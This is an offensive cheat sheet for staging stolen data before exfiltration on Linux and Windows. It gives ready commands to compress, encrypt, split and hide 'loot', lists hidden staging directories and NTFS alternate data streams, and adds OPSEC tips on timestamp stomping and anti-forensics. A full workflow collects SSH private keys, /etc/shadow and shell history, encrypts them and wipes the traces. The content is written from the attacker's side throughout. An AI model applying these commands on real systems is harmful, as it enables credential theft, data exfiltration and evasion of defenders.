# Data Staging Reference — Compress, Encrypt, Split & Stage

## Compression

### tar (Linux/macOS)

```bash
# gzip (most compatible)
tar czf /tmp/.data.tar.gz /path/to/loot/
tar czf /tmp/.d.tgz --exclude="*.log" --exclude="*.tmp" /home/user/

# bzip2 (better compression, slower)
tar cjf /tmp/.data.tar.bz2 /path/to/loot/

# xz (best compression, slowest)
tar cJf /tmp/.data.tar.xz /path/to/loot/

# Pipe directly to encryption (no intermediate file)
tar czf - /path/to/loot/ | openssl enc -aes-256-cbc -salt -pbkdf2 -out /tmp/.data.enc -k "password"
```

### 7-Zip (Cross-Platform)

```bash
# Standard encrypted archive (AES-256)
7z a -p"P@ssw0rd!" archive.7z /path/to/files

# Encrypted filenames (attacker can't even see what's inside)
7z a -p"P@ssw0rd!" -mhe=on archive.7z /path/to/files

# Split into volumes during compression
7z a -p"P@ssw0rd!" -mhe=on -v512k archive.7z /path/to/files
# Produces: archive.7z.001, archive.7z.002, etc.

# Maximum compression
7z a -p"P@ssw0rd!" -mhe=on -mx=9 archive.7z /path/to/files
```

### zip (Windows-Friendly)

```bash
# Password-protected zip
zip -r -e -P "P@ssw0rd!" /tmp/data.zip /path/to/loot/

# PowerShell (Windows, no password support natively)
Compress-Archive -Path C:\loot\* -DestinationPath C:\temp\data.zip

# PowerShell with .NET (password support)
Add-Type -Assembly 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::CreateFromDirectory('C:\loot', 'C:\temp\data.zip')
```

---

## Encryption

### OpenSSL

```bash
# AES-256-CBC (standard, reliable)
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -k "P@ssw0rd!"

# Decrypt (attacker side)
openssl enc -d -aes-256-cbc -pbkdf2 -in data.enc -out data.tar.gz -k "P@ssw0rd!"

# Using a key file instead of password
openssl rand -out /tmp/.key 32
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -kfile /tmp/.key

# One-liner: compress + encrypt
tar czf - /path/to/loot | openssl enc -aes-256-cbc -salt -pbkdf2 -k "pass" > /tmp/.data.enc

# Decrypt + decompress (attacker side)
openssl enc -d -aes-256-cbc -pbkdf2 -k "pass" -in data.enc | tar xzf -
```

### GPG

```bash
# Symmetric encryption (passphrase)
gpg -c --cipher-algo AES256 data.tar.gz
# Produces: data.tar.gz.gpg

# Asymmetric (encrypt to your public key — no password to type on target)
gpg --import attacker_pub.asc
gpg -e -r attacker@email.com data.tar.gz
# Produces: data.tar.gz.gpg (only your private key can decrypt)

# Decrypt (attacker side)
gpg -d data.tar.gz.gpg > data.tar.gz
```

**Tip:** Asymmetric GPG is ideal — import your public key on target, encrypt,
and no passphrase is typed/logged on the compromised system.

---

## Splitting Large Files

```bash
# split (Linux/macOS)
split -b 512K data.enc chunk_              # 512KB chunks → chunk_aa, chunk_ab, ...
split -b 1M data.enc chunk_               # 1MB chunks
split -b 5M data.enc chunk_               # 5MB chunks
split -n 10 data.enc chunk_               # split into exactly 10 files

# Reassemble (attacker side)
cat chunk_* > data.enc

# Windows (PowerShell)
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.enc")
$chunkSize = 512KB
for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
    $chunk = $bytes[$i..([Math]::Min($i + $chunkSize - 1, $bytes.Length - 1))]
    [IO.File]::WriteAllBytes("C:\temp\chunk_$([Math]::Floor($i/$chunkSize))", $chunk)
}
```

---

## Staging Locations

### Linux

```bash
/tmp/.cache/              # hidden directory in /tmp
/dev/shm/.work/           # tmpfs (RAM) — NO disk writes, cleared on reboot
/var/tmp/.update/         # survives reboots, less scrutinized than /tmp
/opt/.cache/              # if writable
/var/spool/cron/.data/    # unusual location, may avoid detection

# Create staging area
mkdir -p /dev/shm/.work && chmod 700 /dev/shm/.work
```

### Windows

```powershell
C:\Windows\Temp\                                  # system temp (requires admin)
C:\ProgramData\                                   # hidden by default
$env:LOCALAPPDATA\Temp\                            # user temp
C:\Users\Public\Libraries\                         # writable by all users
C:\Windows\Tasks\                                  # often overlooked
C:\$Recycle.Bin\                                   # recycle bin (ADS possible)

# Create hidden staging folder
mkdir C:\ProgramData\.cache
attrib +h +s C:\ProgramData\.cache                 # hidden + system attributes
```

### Alternate Data Streams (Windows NTFS)

```powershell
# Hide data in ADS (invisible to dir, only findable with /r or streams.exe)
type data.enc > C:\Windows\Temp\legit.log:hidden
# Extract:
more < C:\Windows\Temp\legit.log:hidden > data.enc
# Find ADS:
dir /r C:\Windows\Temp\
```

---

## Full Staging Workflow Example

```bash
# 1. Collect into staging directory
mkdir -p /dev/shm/.work
cp ~/.ssh/id_rsa /dev/shm/.work/
cp /etc/shadow /dev/shm/.work/
cp ~/.bash_history /dev/shm/.work/

# 2. Compress
tar czf /dev/shm/.work/data.tar.gz -C /dev/shm/.work id_rsa shadow bash_history

# 3. Encrypt
openssl enc -aes-256-cbc -salt -pbkdf2 -in /dev/shm/.work/data.tar.gz \
  -out /dev/shm/.work/data.enc -k "ExfilPass123!"

# 4. Split (if needed for size constraints)
split -b 512K /dev/shm/.work/data.enc /dev/shm/.work/chunk_

# 5. Clean up intermediate files
rm /dev/shm/.work/data.tar.gz /dev/shm/.work/id_rsa /dev/shm/.work/shadow /dev/shm/.work/bash_history

# 6. Exfiltrate chunks → then clean staging
rm -rf /dev/shm/.work
```

---

## OPSEC Notes

- **Use /dev/shm/** on Linux — RAM-backed, no disk forensics
- **Timestamp stomp:** `touch -r /etc/hosts /tmp/.data.enc` to match existing timestamps
- **Minimize staging time** — compress, encrypt, exfil, then immediately clean up
- **Encrypted filenames** (`7z -mhe=on`) prevent defenders from seeing file list
- **Avoid massive archives** — be selective; 50GB over C2 is impractical and noisy
- **File size awareness:** Know your C2 channel's throughput limits before staging
- **Clean up everything:** Remove staging dirs, split chunks, intermediate files after exfil
